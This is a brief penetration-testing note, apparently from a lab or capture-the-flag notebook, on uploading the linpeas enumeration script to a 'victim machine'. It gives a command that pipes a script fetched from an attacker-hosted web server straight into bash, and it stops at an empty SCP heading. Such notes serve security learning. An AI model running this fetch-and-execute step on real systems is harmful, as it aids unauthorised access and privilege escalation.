# Using linpeas on the victim machine

Ok so, _linpeas_ has to be uploaded one way or another to the victim machine to be able to use it. It's just a shell script, but there are multiple ways to get it there.

## Method 1 - Curl

**Step 1:** Set up a _Python Web Server_ in the directory with the _linpeas.sh_ file



**Step 2:** After it's hosted, _curl_ it and pipe it immediately into _bash_ to run it immediately, like so:

```
curl http://[IP Address]:[Port]/linpeas.sh | bash
```

**Step 3:** Stonks


## Method 2 - SCP
